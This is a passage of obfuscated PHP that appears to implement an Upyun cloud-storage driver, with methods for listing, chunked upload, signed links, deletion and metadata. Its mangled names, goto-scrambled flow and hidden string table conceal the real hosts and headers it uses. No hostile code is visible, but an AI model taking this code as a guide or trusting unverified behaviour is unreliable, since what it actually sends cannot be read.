$DÁçÃÓã™ñ = array($d™ƒš’Ø‘[1328] . "\x2f{$this->bucket}\57{$FİëºÄ¨Îä}", $d™ƒš’Ø‘[1327]); $cø ÒÙ±éÎ = $this->ussRequest($fÀ„ÍøâõÔ, $d™ƒš’Ø‘[226], !1, $DÁçÃÓã™ñ); return $cø ÒÙ±éÎ[$d™ƒš’Ø‘[1076]] ? !0 : $this->getPathOuter($fÀ„ÍøâõÔ); } public function delFile($fŒ‘ ¼¼Ÿ) { $cœÀÜÆ„ë† =& $_SERVER[æ§›¦ÌáØ]; $F›Éö¶‘Š = $this->ussRequest($fŒ‘ ¼¼Ÿ, $cœÀÜÆ„ë†[1329]); return $F›Éö¶‘Š[$cœÀÜÆ„ë†[1076]] ? !0 : !1; } public function delFolder($b¹í‚”‹‡) { goto Bç‚á¸•¹; D½ó’òÎÃ: $fŠÛ“íã­± = $FèÑêì¬µ = array(); $this->fileList($b¹í‚”‹‡, $fŠÛ“íã­±, $FèÑêì¬µ, !0); $this->listItemCache = !0; goto DœÖºî·¸; DœÖºî·¸: foreach ($FèÑêì¬µ as $f”Ä§â³ğ‹) { $FßŞ’‹ê = $this->ussRequest($f”Ä§â³ğ‹[$cò“¥¥Ì§Æ[28]], $cò“¥¥Ì§Æ[1329]); if (!$FßŞ’‹ê[$cò“¥¥Ì§Æ[1076]]) { return !1; } } foreach ($fŠÛ“íã­± as $cÅ–”í‘­µ) { $FßŞ’‹ê = $this->ussRequest($cÅ–”í‘­µ, $cò“¥¥Ì§Æ[1329]); if (!$FßŞ’‹ê[$cò“¥¥Ì§Æ[1076]]) { return !1; } } $FßŞ’‹ê = $this->ussRequest($b¹í‚”‹‡, $cò“¥¥Ì§Æ[1329]); goto DÅğÃÖÛÉ; DÅğÃÖÛÉ: return $FßŞ’‹ê[$cò“¥¥Ì§Æ[1076]]; goto B™Æîç¹Š; Bç‚á¸•¹: $cò“¥¥Ì§Æ =& $_SERVER[æ§›¦ÌáØ]; if (!$this->exist($b¹í‚”‹‡)) { return !0; } $this->listItemCache = !1; goto D½ó’òÎÃ; B™Æîç¹Š: } public function rename($C«¢çÒ‚¯, $BíóŠøÂ¤ê) { if ($this->isFile($C«¢çÒ‚¯)) { $BíóŠøÂ¤ê = get_path_father($C«¢çÒ‚¯) . $BíóŠøÂ¤ê; return $this->moveFile($C«¢çÒ‚¯, $BíóŠøÂ¤ê); } return $this->renameObject($C«¢çÒ‚¯, $BíóŠøÂ¤ê); } public function fileInfo($c¤Ö—Çì‰, $FŸ¶ÖõÛğÁ = false, $E³’ÙÕÑ„Ê = array()) { goto fÔó«é¼¤; dêñª±îÁª: $dÀ†¡¢Õ¼º[$fÍ¾©ˆœñ[194]] = $dÀ†¡¢Õ¼º[$fÍ¾©ˆœñ[84]] = 0; $dÀ†¡¢Õ¼º[$fÍ¾©ˆœñ[195]] = $dÀ†¡¢Õ¼º[$fÍ¾©ˆœñ[196]] = !0; if (empty($E³’ÙÕÑ„Ê)) { $E³’ÙÕÑ„Ê = $this->objectMeta($c¤Ö—Çì‰); if (!$E³’ÙÕÑ„Ê) { return $dÀ†¡¢Õ¼º; } } goto f†‹á˜«‚¯; fÔó«é¼¤: $fÍ¾©ˆœñ =& $_SERVER[æ§›¦ÌáØ]; $dÀ†¡¢Õ¼º = array($fÍ¾©ˆœñ[28] => $this->pathThis($c¤Ö—Çì‰), $fÍ¾©ˆœñ[76] => $this->getPathOuter($fÍ¾©ˆœñ[8] . $c¤Ö—Çì‰), $fÍ¾©ˆœñ[29] => $fÍ¾©ˆœñ[193], $fÍ¾©ˆœñ[78] => isset($E³’ÙÕÑ„Ê[$fÍ¾©ˆœñ[78]]) ? $E³’ÙÕÑ„Ê[$fÍ¾©ˆœñ[78]] : 0, $fÍ¾©ˆœñ[168] => $this->ext($c¤Ö—Çì‰)); if ($FŸ¶ÖõÛğÁ) { return $dÀ†¡¢Õ¼º; } goto dêñª±îÁª; FÕŞÅÇƒ†¶: return $dÀ†¡¢Õ¼º; goto c­´½¦¦Ê; f†‹á˜«‚¯: $dÀ†¡¢Õ¼º[$fÍ¾©ˆœñ[194]] = intval($E³’ÙÕÑ„Ê[$fÍ¾©ˆœñ[1330]]); $dÀ†¡¢Õ¼º[$fÍ¾©ˆœñ[84]] = intval($E³’ÙÕÑ„Ê[$fÍ¾©ˆœñ[1331]]); $dÀ†¡¢Õ¼º[$fÍ¾©ˆœñ[78]] = $E³’ÙÕÑ„Ê[$fÍ¾©ˆœñ[78]]; goto FÕŞÅÇƒ†¶; c­´½¦¦Ê: } public function folderInfo($c “³Á‡‘—, $eÇø†’°ª» = false) { goto bšÈšğ›•; e¬¾ïì¯¢: $DñÁœ›×…[$d‹Ñó¶„®ö[194]] = $DñÁœ›×…[$d‹Ñó¶„®ö[84]] = 0; $DñÁœ›×…[$d‹Ñó¶„®ö[195]] = $DñÁœ›×…[$d‹Ñó¶„®ö[196]] = !0; if (empty($CÆÊ˜)) { $CÆÊ˜ = $this->objectMeta($c “³Á‡‘—); if (!$CÆÊ˜) { return $DñÁœ›×…; } } goto C¿©§ß±‚„; bšÈšğ›•: $d‹Ñó¶„®ö =& $_SERVER[æ§›¦ÌáØ]; $DñÁœ›×… = array($d‹Ñó¶„®ö[28] => $this->pathThis($c “³Á‡‘—), $d‹Ñó¶„®ö[76] => $this->getPathOuter($d‹Ñó¶„®ö[8] . $c “³Á‡‘—), $d‹Ñó¶„®ö[29] => $d‹Ñó¶„®ö[77]); if ($eÇø†’°ª») { return $DñÁœ›×…; } goto e¬¾ïì¯¢; C¿©§ß±‚„: $DñÁœ›×…[$d‹Ñó¶„®ö[194]] = intval($CÆÊ˜[$d‹Ñó¶„®ö[1330]]); $DñÁœ›×…[$d‹Ñó¶„®ö[84]] = intval($CÆÊ˜[$d‹Ñó¶„®ö[1331]]); return $DñÁœ›×…; goto a†‹„‹·; a†‹„‹·: } private function listObjs($Eæ‹„ĞÎè£, $cÒæ¢Ú§“º = 0, $D¬É”…¿øë = 1000) { $D‡‚ŠÄÆ«’ =& $_SERVER[æ§›¦ÌáØ]; $aÓê²ë®ÏĞ = array($D‡‚ŠÄÆ«’[1332], $D‡‚ŠÄÆ«’[1333] . $D¬É”…¿øë); if ($cÒæ¢Ú§“º) { $aÓê²ë®ÏĞ[] = $D‡‚ŠÄÆ«’[1334] . $cÒæ¢Ú§“º; } $eÎÙáƒ¾À˜ = $this->ussRequest($Eæ‹„ĞÎè£, $D‡‚ŠÄÆ«’[228], !1, $aÓê²ë®ÏĞ); return !$eÎÙáƒ¾À˜[$D‡‚ŠÄÆ«’[1076]] ? !1 : $eÎÙáƒ¾À˜[$D‡‚ŠÄÆ«’[1078]]; } private function fileList($BŒ‘ìƒÎØŞ, &$FğµÒßœÕÈ, &$d©éä“ĞŞÇ, $Eìº‰Ø‰ŒÒ = false) { goto A®í¾ôÙÜ; E‹ˆªàÛœÖ: if ($a—ùÌàŒÓ) { $this->cacheMethod($eˆ×à¤À¯è[199], $BŒ‘ìƒÎØŞ, !0); } goto BˆáÜà™ï; A®í¾ôÙÜ: $eˆ×à¤À¯è =& $_SERVER[æ§›¦ÌáØ]; $Dåç­ùÀË = $eˆ×à¤À¯è[33]; $E·†…‘ä”Í = 1000; goto a–¨•§àÌñ; a–¨•§àÌñ: $Fˆ¾»ŞñÈí = rtrim($BŒ‘ìƒÎØŞ, $eˆ×à¤À¯è[8]) . $eˆ×à¤À¯è[8]; $a—ùÌàŒÓ = $this->listItemCache === !1 ? !1 : !0; while (!0) { check_abort(); $BÍÕ¶ÙùäÉ = $this->listObjs($BŒ‘ìƒÎØŞ, $Dåç­ùÀË, $E·†…‘ä”Í); if (!$BÍÕ¶ÙùäÉ) { return !1; } $Dåç­ùÀË = isset($BÍÕ¶ÙùäÉ[$eˆ×à¤À¯è[1335]]) ? $BÍÕ¶ÙùäÉ[$eˆ×à¤À¯è[1335]] : $eˆ×à¤À¯è[33]; $fáêöË–° = isset($BÍÕ¶ÙùäÉ[$eˆ×à¤À¯è[1336]]) ? $BÍÕ¶ÙùäÉ[$eˆ×à¤À¯è[1336]] : array(); foreach ($fáêöË–° as $B¢ŸÓÄËá) { $DïÀ±±øÌ£ = $B¢ŸÓÄËá[$eˆ×à¤À¯è[29]] == $eˆ×à¤À¯è[77] ? !0 : !1; $BîáãâİÑ÷ = ltrim($Fˆ¾»ŞñÈí . $B¢ŸÓÄËá[$eˆ×à¤À¯è[28]], $eˆ×à¤À¯è[8]) . ($DïÀ±±øÌ£ ? $eˆ×à¤À¯è[8] : $eˆ×à¤À¯è[33]); $CÊŠŞ†µğ¦ = array($eˆ×à¤À¯è[28] => $BîáãâİÑ÷, $eˆ×à¤À¯è[29] => $DïÀ±±øÌ£ ? $eˆ×à¤À¯è[77] : $eˆ×à¤À¯è[193], $eˆ×à¤À¯è[78] => $B¢ŸÓÄËá[$eˆ×à¤À¯è[335]], $eˆ×à¤À¯è[1331] => $B¢ŸÓÄËá[$eˆ×à¤À¯è[1337]]); if ($a—ùÌàŒÓ) { $this->cacheMethod($eˆ×à¤À¯è[199], $BîáãâİÑ÷, $DïÀ±±øÌ£); $this->cacheMethod($eˆ×à¤À¯è[200], $BîáãâİÑ÷, $CÊŠŞ†µğ¦); } if ($DïÀ±±øÌ£) { $FğµÒßœÕÈ[] = $BîáãâİÑ÷; if ($Eìº‰Ø‰ŒÒ) { $this->fileList($BîáãâİÑ÷, $FğµÒßœÕÈ, $d©éä“ĞŞÇ, $Eìº‰Ø‰ŒÒ); } continue; } $d©éä“ĞŞÇ[] = $CÊŠŞ†µğ¦; } if (count($fáêöË–°) < $E·†…‘ä”Í) { break; } } goto E‹ˆªàÛœÖ; BˆáÜà™ï: } public function listPath($eºè”…©Ğ, $CÏÆ¶ÎÛôö = false) { $eõê‚¥Å’ =& $_SERVER[æ§›¦ÌáØ]; $A„îòŸÔæ = $Eˆ‰»ÎÛ®Ä = array(); $this->fileList($eºè”…©Ğ, $A„îòŸÔæ, $Eˆ‰»ÎÛ®Ä); foreach ($A„îòŸÔæ as $Fö˜´¤¦ñõ => $F®à¥ Ÿğ•) { $A„îòŸÔæ[$Fö˜´¤¦ñõ] = $this->folderInfo($F®à¥ Ÿğ•, $CÏÆ¶ÎÛôö); } foreach ($Eˆ‰»ÎÛ®Ä as $Fö˜´¤¦ñõ => $F®à¥ Ÿğ•) { $Eˆ‰»ÎÛ®Ä[$Fö˜´¤¦ñõ] = $this->fileInfo($F®à¥ Ÿğ•[$eõê‚¥Å’[28]], $CÏÆ¶ÎÛôö, $F®à¥ Ÿğ•); } return array($eõê‚¥Å’[75] => $A„îòŸÔæ, $eõê‚¥Å’[74] => $Eˆ‰»ÎÛ®Ä); } public function has($d«‡ ¡§²½, $a¹å§„Î’ = false, $f„Ô’ô««Î = true) { goto f°èÓÚâÏÅ; f°èÓÚâÏÅ: $A³ÓÕ¯Éë² =& $_SERVER[æ§›¦ÌáØ]; $EùŞ–æ‘ØË = $A³ÓÕ¯Éë²[33]; $EÊœÉÉŠ• = 500; goto A¯Ä¼òÁŸÓ; aİˆ«×: while (!0) { check_abort(); $A®Ìİ”…Ê = $this->listObjs($d«‡ ¡§²½, $EùŞ–æ‘ØË, $EÊœÉÉŠ•); if (!$A®Ìİ”…Ê) { return !1; } $EùŞ–æ‘ØË = isset($A®Ìİ”…Ê[$A³ÓÕ¯Éë²[1335]]) ? $A®Ìİ”…Ê[$A³ÓÕ¯Éë²[1335]] : $A³ÓÕ¯Éë²[33]; $BçÍÕ¾ Ó = isset($A®Ìİ”…Ê[$A³ÓÕ¯Éë²[1336]]) ? $A®Ìİ”…Ê[$A³ÓÕ¯Éë²[1336]] : array(); if (empty($BçÍÕ¾ Ó)) { break; } $c¬ÊÙ©‡†Ô = array_filter($BçÍÕ¾ Ó, function ($A®È¦•ëî½) { $a”œÜñÚ‰ =& $_SERVER[æ§›¦ÌáØ]; return $A®È¦•ëî½[$a”œÜñÚ‰[29]] == $a”œÜñÚ‰[77]; }); $c²º‚ Šª = count($BçÍÕ¾ Ó); $c¬ÊÙ©‡†Ô = count($c¬ÊÙ©‡†Ô); $Cø¬šôñ¼Ò = $c²º‚ Šª - $c¬ÊÙ©‡†Ô; if ($a¹å§„Î’) { $c‘å±©ÚÀº += $c¬ÊÙ©‡†Ô; $cà¾äÄˆ‰Ã += $Cø¬šôñ¼Ò; if ($c²º‚ Šª < $EÊœÉÉŠ•) { break; } continue; } if ($f„Ô’ô««Î) { if ($Cø¬šôñ¼Ò) { return !0; } } else { if ($c¬ÊÙ©‡†Ô) { return !0; } } if ($c²º‚ Šª < $EÊœÉÉŠ•) { break; } } if ($a¹å§„Î’) { return array($A³ÓÕ¯Éë²[203] => $cà¾äÄˆ‰Ã, $A³ÓÕ¯Éë²[204] => $c‘å±©ÚÀº); } return !1; goto d›ó•Ğä; A¯Ä¼òÁŸÓ: $cà¾äÄˆ‰Ã = 0; $c‘å±©ÚÀº = 0; $Ešˆ¡‚¯‡³ = rtrim($d«‡ ¡§²½, $A³ÓÕ¯Éë²[8]) . $A³ÓÕ¯Éë²[8]; goto aİˆ«×; d›ó•Ğä: } public function listAll($d£‹Èˆñö÷) { goto FÆ‰¸Úôäé; aˆ¦Å‘ÕÓ¿: return $this->listAllFiles($d£‹Èˆñö÷, array_keys($A„±¥ÊÂ×Ş), $A„±¥ÊÂ×Ş); goto AÅ‰±°‚ô; FÆ‰¸Úôäé: $f“Í¢ºÄõÚ =& $_SERVER[æ§›¦ÌáØ]; $A‘»ï‡”ª = $FÀ¥„‡…½ï = array(); $this->fileList($d£‹Èˆñö÷, $A‘»ï‡”ª, $FÀ¥„‡…½ï, !0); goto EÕ‰ÀŒêÅÒ; EÕ‰ÀŒêÅÒ: $A„±¥ÊÂ×Ş = array(); foreach ($FÀ¥„‡…½ï as $d‘Üˆê‚¸ã) { $A„±¥ÊÂ×Ş[$d‘Üˆê‚¸ã[$f“Í¢ºÄõÚ[28]]] = $d‘Üˆê‚¸ã[$f“Í¢ºÄõÚ[78]]; } foreach ($A‘»ï‡”ª as $d‘Üˆê‚¸ã) { if (is_string($d‘Üˆê‚¸ã)) { $A„±¥ÊÂ×Ş[$d‘Üˆê‚¸ã] = 0; } } goto aˆ¦Å‘ÕÓ¿; AÅ‰±°‚ô: } public function canRead($dˆ ‰ œÂÀ) { return $this->exist($dˆ ‰ œÂÀ) ? !0 : !1; } public function canWrite($dÔœÆÏæ¶Î) { return $this->exist($dÔœÆÏæ¶Î) ? !0 : !1; } public function getContent($a½›•„ÊõÌ) { return $this->fileSubstr($a½›•„ÊõÌ, 0, -1); } public function setContent($Bë†ÛÊ²†‡, $cí¿Ñ‡œÎô = '') { $b°âË«Ìë³ =& $_SERVER[æ§›¦ÌáØ]; if (!$cí¿Ñ‡œÎô) { $e¤äƒ‡è†˜ = $this->ussRequest($Bë†ÛÊ²†‡, $b°âË«Ìë³[224]); return $e¤äƒ‡è†˜[$b°âË«Ìë³[1076]]; } $e½»Ëô³Â¤ = $this->tempFile($this->pathThis($Bë†ÛÊ²†‡)); file_put_contents($e½»Ëô³Â¤, $cí¿Ñ‡œÎô); if ($this->upload($Bë†ÛÊ²†‡, $e½»Ëô³Â¤)) { $this->tempFileRemve($e½»Ëô³Â¤); return !0; } return !1; } public function fileSubstr($f²º°æõÑ™, $Có¤ÓÌ•›†, $E×Š­èçİì) { $b‹ƒ’ËŠ¥ =& $_SERVER[æ§›¦ÌáØ]; if (!($a²´À¨ï¹· = $this->link($f²º°æõÑ™))) { return !1; } $B²ËóÍÚ×· = !1; if ($E×Š­èçİì > 0) { $bæé»´¨Çá = $Có¤ÓÌ•›† + $E×Š­èçİì - 1; $B²ËóÍÚ×· = array($b‹ƒ’ËŠ¥[1298] . $Có¤ÓÌ•›† . $b‹ƒ’ËŠ¥[440] . $bæé»´¨Çá); } $báö’š»óŸ = url_request($a²´À¨ï¹·, $b‹ƒ’ËŠ¥[228], !1, $B²ËóÍÚ×·); return $báö’š»óŸ[$b‹ƒ’ËŠ¥[703]] ? $báö’š»óŸ[$b‹ƒ’ËŠ¥[1078]] : !1; } public function upload($Eª»¼—œÒŒ, $dßÍŒ£Ø‘, $e‡˜ÃÊã‹´ = false, $F‘ÜÉÓ‹†— = REPEAT_REPLACE) { goto b»ÅÜœ›Ñ; DäÏƒ›Í„Û: $F¬œ†¾­¤Œ = $this->ussRequest($Eª»¼—œÒŒ, $añ·Ü•ø¢Î[226], !1, $FÄ¥÷°™™); return $F¬œ†¾­¤Œ[$añ·Ü•ø¢Î[1076]] ? $this->getPathOuter($bÀö‘å¿“Í) : !1; goto E×æòã¼‘ˆ; døØ£¯îÛ: if (!$F¬œ†¾­¤Œ[$añ·Ü•ø¢Î[1076]]) { return !1; } $aİÕç‚èŸ¶ = $F¬œ†¾­¤Œ[$añ·Ü•ø¢Î[1078]]; $aÅ…çÂ®–™ = 0; goto F¡¢˜¹‚Í¼; b»ÅÜœ›Ñ: $añ·Ü•ø¢Î =& $_SERVER[æ§›¦ÌáØ]; $Cİñùö‘Ìå = IO::size($dßÍŒ£Ø‘); if ($Cİñùö‘Ìå <= 1024 * 1024 * 200) { $A¦å©ù¤ªŸ = array($añ·Ü•ø¢Î[1338] . $dßÍŒ£Ø‘); $F¬œ†¾­¤Œ = $this->ussRequest($Eª»¼—œÒŒ, $añ·Ü•ø¢Î[226], $A¦å©ù¤ªŸ); return $F¬œ†¾­¤Œ[$añ·Ü•ø¢Î[1076]] ? $this->getPathOuter($Eª»¼—œÒŒ) : !1; } goto fø›ø·ñÁ×; fğÂèÄßÙ: do { $BÔÒ×Œˆİ´ = $aİÕç‚èŸ¶[$añ·Ü•ø¢Î[1344]]; fseek_64($EÚ‚ ùìø, $aÅ…çÂ®–™); $a‰ä•äˆ°ê = fread($EÚ‚ ùìø, $BÔÒ×Œˆİ´); $d”ò´øµ• = 0; do { $d”ò´øµ•++; $aİÕç‚èŸ¶ = $this->uploadPart($Eª»¼—œÒŒ, $aİÕç‚èŸ¶, $a‰ä•äˆ°ê); } while (!$aİÕç‚èŸ¶ && $d”ò´øµ• < 3); if (!$aİÕç‚èŸ¶) { return !1; } $F¾ÑŞª‚‚‰ = $aİÕç‚èŸ¶[$añ·Ü•ø¢Î[1343]]; $aÅ…çÂ®–™ += $BÔÒ×Œˆİ´; } while ($F¾ÑŞª‚‚‰ != -1); fclose($EÚ‚ ùìø); $FÄ¥÷°™™ = array($añ·Ü•ø¢Î[1345], $añ·Ü•ø¢Î[1346] . $aİÕç‚èŸ¶[$añ·Ü•ø¢Î[1347]], $añ·Ü•ø¢Î[1341]); goto DäÏƒ›Í„Û; F¡¢˜¹‚Í¼: $F¾ÑŞª‚‚‰ = $aİÕç‚èŸ¶[$añ·Ü•ø¢Î[1343]]; $EÚ‚ ùìø = fopen($dßÍŒ£Ø‘, $añ·Ü•ø¢Î[1249]); if (!$EÚ‚ ùìø) { return !1; } goto fğÂèÄßÙ; fø›ø·ñÁ×: $CÙ‰ˆÆÔç = 1024 * 1024 * 10; $FÄ¥÷°™™ = array($añ·Ü•ø¢Î[1339], $añ·Ü•ø¢Î[1340] . $Cİñùö‘Ìå, $añ·Ü•ø¢Î[1341], $añ·Ü•ø¢Î[1342] . $CÙ‰ˆÆÔç); $F¬œ†¾­¤Œ = $this->ussRequest($Eª»¼—œÒŒ, $añ·Ü•ø¢Î[226], !1, $FÄ¥÷°™™); goto døØ£¯îÛ; E×æòã¼‘ˆ: } private function uploadPart($Dõ±õˆè…–, $fŞ‰²±Àºô, &$BÄÚ»‹¯ê©) { $Eò©‘¡éâ =& $_SERVER[æ§›¦ÌáØ]; $A•«ŞÂŒ›´ = array($Eò©‘¡éâ[1348], $Eò©‘¡éâ[1346] . $fŞ‰²±Àºô[$Eò©‘¡éâ[1347]], $Eò©‘¡éâ[1349] . $fŞ‰²±Àºô[$Eò©‘¡éâ[1343]], $Eò©‘¡éâ[141] . $fŞ‰²±Àºô[$Eò©‘¡éâ[1344]]); $c´õ·Œº…Ñ = $this->ussRequest($Dõ±õˆè…–, $Eò©‘¡éâ[226], $BÄÚ»‹¯ê©, $A•«ŞÂŒ›´); return !$c´õ·Œº…Ñ[$Eò©‘¡éâ[1076]] ? $c´õ·Œº…Ñ[$Eò©‘¡éâ[1076]] : $c´õ·Œº…Ñ[$Eò©‘¡éâ[1078]]; } public function uploadFormData($a«¯©ˆàÃ¿, $c……æšùÏã = 3600) { return $this->uploadPolicy($a«¯©ˆàÃ¿, $c……æšùÏã); } public function multiUploadFormData($eœğ›Ó®ä±, $b±™£íäÛÒ = 3600) { $B÷éÃ­·ÊŸ =& $_SERVER[æ§›¦ÌáØ]; $FèÀ£Íç“Ÿ = (int) $GLOBALS[$B÷éÃ­·ÊŸ[7]][$B÷éÃ­·ÊŸ[78]]; return $this->uploadPolicy($eœğ›Ó®ä±, $b±™£íäÛÒ, $FèÀ£Íç“Ÿ); } private function uploadPolicy($fÕÓ’æ‘ø, $AéÒº×Áº = 3600, $BÀ¸ŠÄÛí = 0) { goto dœó§…‡˜; FŞª­øÃß: $D‚ƒ¤¤ôĞ = array($AõÍ«× …[1350] => $this->bucket, $AõÍ«× …[1351] => $fÕÓ’æ‘ø, $AõÍ«× …[1352] => time() + $AéÒº×Áº, $AõÍ«× …[1353] => $F›òä´Õ¥Š); if ($BÀ¸ŠÄÛí) { $D‚ƒ¤¤ôĞ[$AõÍ«× …[1265]] = $BÀ¸ŠÄÛí; } $D»­ˆ‚¥…´ = base64_encode(json_encode($D‚ƒ¤¤ôĞ)); goto AÃ¨¢–¾ŒÅ; dœó§…‡˜: $AõÍ«× … =& $_SERVER[æ§›¦ÌáØ]; $c‚ÌÇŠä = $AõÍ«× …[8] . $this->bucket; $F›òä´Õ¥Š = gmdate($AõÍ«× …[1285]); goto FŞª­øÃß; AÃ¨¢–¾ŒÅ: $e©êÁö¤ƒ = base64_encode(hash_hmac($AõÍ«× …[1320], "\120\117\x53\x54\46{$c‚ÌÇŠä}\x26{$F›òä´Õ¥Š}\46{$D»­ˆ‚¥…´}", md5("{$this->userpass}"), !0)); $dáõŞ©Ş¥ = array($AõÍ«× …[1191] => $D»­ˆ‚¥…´, $AõÍ«× …[1354] => "\x55\x50\131\125\116\40{$this->username}\72{$e©êÁö¤ƒ}", $AõÍ«× …[175] => $this->endpoint . $c‚ÌÇŠä); return $dáõŞ©Ş¥; goto EÓ„‹„‚£; EÓ„‹„‚£: } public function download($E¦ˆó†ä‹’, $f²íãåÒ) { goto C„ß¢¬ ¶é; C„ß¢¬ ¶é: $aĞù·Ä‚–½ = IO::getPathInner(IO::mkfile($f²íãåÒ)); if (!($B¶’çŸ­ÄÀ = $this->link($E¦ˆó†ä‹’))) { return !1; } $aæò²ÏÚ®ì = 0; goto e„ •ã¬œä; e„ •ã¬œä: $a°º¤”‘ë” = 1024 * 200; $Aù•ª’˜À = fopen($aĞù·Ä‚–½, $_SERVER[æ§›¦ÌáØ][1304]); while (!0) { $C‡·Ÿïâ = $this->fileSubstr($E¦ˆó†ä‹’, $aæò²ÏÚ®ì, $a°º¤”‘ë”); if ($C‡·Ÿïâ === !1) { return !1; } fwrite($Aù•ª’˜À, $C‡·Ÿïâ); $aæò²ÏÚ®ì += $a°º¤”‘ë”; if (strlen($C‡·Ÿïâ) < $a°º¤”‘ë”) { break; } } goto EÖíŸ¹Ëğï; EÖíŸ¹Ëğï: fclose($Aù•ª’˜À); return $f²íãåÒ; goto d¶ùŠ¿î°Ù; d¶ùŠ¿î°Ù: } public function link($fÑÛ•¸©¼›, $Eº¾åÉÀ‰Ê = array()) { $Aê¢Æ³—æ =& $_SERVER[æ§›¦ÌáØ]; $fÑÛ•¸©¼› = trim($fÑÛ•¸©¼›, $Aê¢Æ³—æ[8]); if (!empty($this->token)) { $a½¹”ÓøêÀ = strtotime(date($Aê¢Æ³—æ[1355])); $cô¹®˜Ñ· = substr(md5($this->token . $Aê¢Æ³—æ[282] . $a½¹”ÓøêÀ . $Aê¢Æ³—æ[1356] . $fÑÛ•¸©¼›), 12, 8) . $a½¹”ÓøêÀ; $Eº¾åÉÀ‰Ê[] = $Aê¢Æ³—æ[1357] . $cô¹®˜Ñ·; } $eŒ°„æĞÍï = !empty($Eº¾åÉÀ‰Ê) ? $Aê¢Æ³—æ[70] . implode($Aê¢Æ³—æ[282], $Eº¾åÉÀ‰Ê) : $Aê¢Æ³—æ[33]; return $this->getHost() . $Aê¢Æ³—æ[8] . $fÑÛ•¸©¼› . $eŒ°„æĞÍï; } public function fileOut($b¯¸ÁéÇØâ, $F¦ŠƒÂÇ’ù = false, $BŠö³ê‚çµ = false, $fŒÚ¤Ø°¯ä = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($b¯¸ÁéÇØâ, $F¦ŠƒÂÇ’ù, $BŠö³ê‚çµ, $fŒÚ¤Ø°¯ä); } if (!$BŠö³ê‚çµ) { $BŠö³ê‚çµ = $this->pathThis($b¯¸ÁéÇØâ); } $e”àÌ¼è  = $F¦ŠƒÂÇ’ù ? array($_SERVER[æ§›¦ÌáØ][1358] . rawurlencode($BŠö³ê‚çµ)) : array(); $cäïè–—¥‰ = $this->link($b¯¸ÁéÇØâ, $e”àÌ¼è ); $this->fileOutLink($cäïè–—¥‰); } public function fileOutServer($eÊ«à¥Ú³, $B©ÖíÈÉƒ¸ = false, $Bá×„ÍŠ… = false, $cè¤ã½Ç·¯ = '') { parent::fileOut($eÊ«à¥Ú³, $B©ÖíÈÉƒ¸, $Bá×„ÍŠ…, $cè¤ã½Ç·¯); } public function fileOutImage($Fš®„ÄŞ—‹, $DšÆğÅÍ = 250) { $d¹Ë¡Îğˆ = $this->link($Fš®„ÄŞ—‹ . $_SERVER[æ§›¦ÌáØ][1359] . $DšÆğÅÍ); $this->fileOutLink($d¹Ë¡Îğˆ); } public function fileOutImageServer($BßÕáò, $B‚„ŞÑ´Š = 250) { parent::fileOutImage($BßÕáò, $B‚„ŞÑ´Š); } public function hashMd5($a¿–æ†Óñì) { $A†ø†çàµ =& $_SERVER[æ§›¦ÌáØ]; $a£Šßå‹ = $this->_objectMeta($a¿–æ†Óñì); return isset($a£Šßå‹[$A†ø†çàµ[208]]) ? $a£Šßå‹[$A†ø†çàµ[208]] : !1; } public function size($E÷¨œÙùÉ”) { $AöÆ÷ÅÓéµ = $this->objectMeta($E÷¨œÙùÉ”); return $AöÆ÷ÅÓéµ ? $AöÆ÷ÅÓéµ[$_SERVER[æ§›¦ÌáØ][78]] : 0; } public function info($cµáÔ®ƒÂ›) { if ($this->isFolder($cµáÔ®ƒÂ›)) { return $this->folderInfo($cµáÔ®ƒÂ›); } else { if ($this->isFile($cµáÔ®ƒÂ›)) { return $this->fileInfo($cµáÔ®ƒÂ›); } } return !1; } public function exist($D¤ ¸¤É ¡) { return $this->isFile($D¤ ¸¤É ¡) || $this->isFolder($D¤ ¸¤É ¡); } public function isFile($DÁ¢öÜÄ¬) { return !$this->isFolder($DÁ¢öÜÄ¬) && $this->objectMeta($DÁ¢öÜÄ¬); } public function isFolder($FÔŞÀëøãŠ) { return $this->cacheMethod($_SERVER[æ§›¦ÌáØ][199], $FÔŞÀëøãŠ); } protected function objectMeta($aµä­çÊÇÔ) { return $this->cacheMethod($_SERVER[æ§›¦ÌáØ][200], $aµä­çÊÇÔ); } protected function _objectMeta($f“è®‰‘‰Å) { goto F‰½‡¬ÉõÃ; eÀ«¨æ©º: if (!$aŒãÖ“[$A‰‚‚‹¹ÄÅ[1076]]) { return null; } $bšÏ×œ£óÕ = isset($aŒãÖ“[$A‰‚‚‹¹ÄÅ[1078]]) ? $aŒãÖ“[$A‰‚‚‹¹ÄÅ[1078]] : array(); if (!isset($bšÏ×œ£óÕ[$A‰‚‚‹¹ÄÅ[1361]])) { return null; } goto aã´Ô‚©¼Ö; aã´Ô‚©¼Ö: $a‰°¹¨Ä”¯ = array($A‰‚‚‹¹ÄÅ[29] => isset($bšÏ×œ£óÕ[$A‰‚‚‹¹ÄÅ[1361]]) ? $bšÏ×œ£óÕ[$A‰‚‚‹¹ÄÅ[1361]] : null, $A‰‚‚‹¹ÄÅ[78] => isset($bšÏ×œ£óÕ[$A‰‚‚‹¹ÄÅ[1362]]) ? $bšÏ×œ£óÕ[$A‰‚‚‹¹ÄÅ[1362]] : null, $A‰‚‚‹¹ÄÅ[208] => isset($bšÏ×œ£óÕ[$A‰‚‚‹¹ÄÅ[1363]]) ? $bšÏ×œ£óÕ[$A‰‚‚‹¹ÄÅ[1363]] : null, $A‰‚‚‹¹ÄÅ[1330] => isset($bšÏ×œ£óÕ[$A‰‚‚‹¹ÄÅ[1364]]) ? $bšÏ×œ£óÕ[$A‰‚‚‹¹ÄÅ[1364]] : null); $a‰°¹¨Ä”¯[$A‰‚‚‹¹ÄÅ[1331]] = isset($bšÏ×œ£óÕ[$A‰‚‚‹¹ÄÅ[1365]]) ? strtotime($bšÏ×œ£óÕ[$A‰‚‚‹¹ÄÅ[1365]]) : $a‰°¹¨Ä”¯[$A‰‚‚‹¹ÄÅ[1330]]; return $a‰°¹¨Ä”¯; goto cà«µÒ³; F‰½‡¬ÉõÃ: $A‰‚‚‹¹ÄÅ =& $_SERVER[æ§›¦ÌáØ]; if ($f“è®‰‘‰Å == $A‰‚‚‹¹ÄÅ[33] || $f“è®‰‘‰Å == $A‰‚‚‹¹ÄÅ[8]) { return array(); } $aŒãÖ“ = $this->ussRequest($f“è®‰‘‰Å, $A‰‚‚‹¹ÄÅ[1360]); goto eÀ«¨æ©º; cà«µÒ³: } protected function _isFolder($dÃÕªØòÉ¦) { $d¹äÖ…ÃÂ =& $_SERVER[æ§›¦ÌáØ]; if ($dÃÕªØòÉ¦ == 